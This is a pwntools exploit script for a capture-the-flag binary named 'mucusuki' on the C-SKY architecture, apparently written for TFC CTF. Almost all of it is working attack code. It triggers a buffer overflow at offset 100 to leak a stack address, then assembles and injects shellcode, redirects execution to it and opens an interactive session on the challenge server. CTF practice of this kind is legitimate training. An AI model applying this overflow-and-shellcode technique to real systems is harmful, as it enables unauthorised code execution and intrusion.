
#!/usr/bin/env python3
from ctypes import CDLL
import subprocess
import time
from subprocess import Popen
from pwncli import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './mucusuki'
elf = ELF(exe, checksec=True)
# libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "mucusuki-11d7a8f5c284b8f3.challs.tfcctf.com", 1337


gdbscript = f'''
init-gef
file {exe}
set architecture csky
b *0x8150
b *0x818e
b *0x834c
b *0x835e
target remote :5000
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["./qemu", "-g", "5000", exe] + argv)
        else:
            return process(["./qemu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'debug'
        return remote(host, port, ssl=True)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, aslr=False)
    else:
        return process([exe] + argv, aslr=False)

def debug():
    global gdbscript, pid
    if not args.REMOTE:
        if args.QEMU:
            gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
            for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
                gdb_args.extend(["-ex", cmd])
            Popen(gdb_args)
        elif args.DOCKER:
            gdbscript = f'''
            init-pwndbg
            set sysroot /proc/{pid}/root
            c
            '''.format(**locals())        
            attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='chall')
        else:
            attach(io, gdbscript=gdbscript)

s       = lambda data               :io.send(data)
sa      = lambda x, y               :io.sendafter(x, y)
sl      = lambda data               :io.sendline(data)
sla     = lambda x, y               :io.sendlineafter(x, y)
r       = lambda delims             :io.recv(delims)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda data,num           :u32(io.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(io.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{}: {}'.format(name, addr))
l64     = lambda                    :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
ns      = lambda p, data            :next(p.search(data))
nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))


# =========================================================
#                         EXPLOITS
# =========================================================
def getstack():
    global io
    offset = 100
    io = initialize()
    payload = flat({offset:[p32(0) + p32(0x8162)]}, filler=b"A")
    sla(b"Give me something to read:", payload)
    ru(b"\x00\x01\x00\x00")
    stack = u32(r(0x4))
    leak("Stack", hex(stack))
    io.close()
    return stack

def exploit():
    global io
    debug()
    offset = 100
    if args.REMOTE:
        stack = getstack()
    else:
        stack = 0x3fffec6c
    io = initialize()
    subprocess.run(["csky-linux-gnuabiv2-as", "-mcpu=ck807", "-o", "sc.o", "sc.S"], check=True)
    subprocess.run(["csky-linux-gnuabiv2-ld", f"-Ttext={stack:#x}", "-nostdlib", "-o", "sc.elf", "sc.o"], check=True)
    subprocess.run(["csky-linux-gnuabiv2-objcopy", "-O", "binary", "sc.elf", "sc.bin"], check=True)

    with open("sc.bin", "rb") as f:
        shellcode = f.read()
    sla(b"Give me something to read:", shellcode.ljust(offset, b"\x00") + p32(0) + p32(stack))
    io.interactive()

if __name__ == '__main__':
    exploit()
